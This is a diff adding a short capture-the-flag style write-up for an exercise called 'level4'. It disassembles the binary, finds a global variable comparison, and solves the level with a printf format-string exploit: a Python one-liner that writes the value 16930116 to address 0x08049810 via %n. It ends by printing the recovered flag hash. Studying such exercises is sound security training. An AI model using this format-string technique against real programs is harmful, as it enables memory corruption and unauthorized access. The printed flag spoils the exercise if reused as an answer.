@@ -1,0 +1,33 @@
+
+██╗     ███████╗██╗   ██╗███████╗██╗         ██╗  ██╗
+██║     ██╔════╝██║   ██║██╔════╝██║         ██║  ██║
+██║     █████╗  ██║   ██║█████╗  ██║         ███████║
+██║     ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║         ╚════██║
+███████╗███████╗ ╚████╔╝ ███████╗███████╗         ██║
+╚══════╝╚══════╝  ╚═══╝  ╚══════╝╚══════╝         ╚═╝
+                                                     
+
+objdump -d level4
+
+There are two interesting functions: <p> and <n>
+
+Using the same method as in the previous exercise, we determine the offset:
+-> 12
+
+The comparison is made at the function n:
+-> 804848d:	a1 10 98 04 08       	mov    0x8049810,%eax
+-> 8048492:	3d 44 55 02 01       	cmp    $0x1025544,%eax
+
+The address compared is: 0x08049810
+The value 0x1025544 in hexadecimal gives us 16930116 in decimal
+
+We use printf width field to generate 16930112 spaces.
+
+python -c "print '\x10\x98\x04\x08' + '%16930112d' + '%12\$n'" > /tmp/fichier
+
+./level4 < /tmp/fichier | tr -d " "
+
+|══════════════════════════════════════════════════════════════════|
+| 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a |
+|══════════════════════════════════════════════════════════════════|
+
